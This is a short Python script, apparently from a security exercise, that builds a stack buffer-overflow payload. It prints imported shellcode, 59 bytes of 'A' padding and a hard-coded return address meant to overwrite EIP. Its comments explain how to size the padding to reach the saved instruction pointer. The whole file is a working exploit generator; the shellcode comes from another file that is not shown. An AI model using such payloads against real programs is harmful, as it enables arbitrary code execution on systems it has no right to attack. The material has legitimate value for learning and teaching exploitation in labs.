from shellcode import shellcode

def main():
    print(shellcode + (59 * "A") + "\xac\xbd\xfe\xbf")
    #print(shellcode)
    #blah blah blah blah blah
    #print out shellcode first, then start printing "a"s so you know how long the shellcode
    #is and can put the appropriate overflow to reach eip space
main()
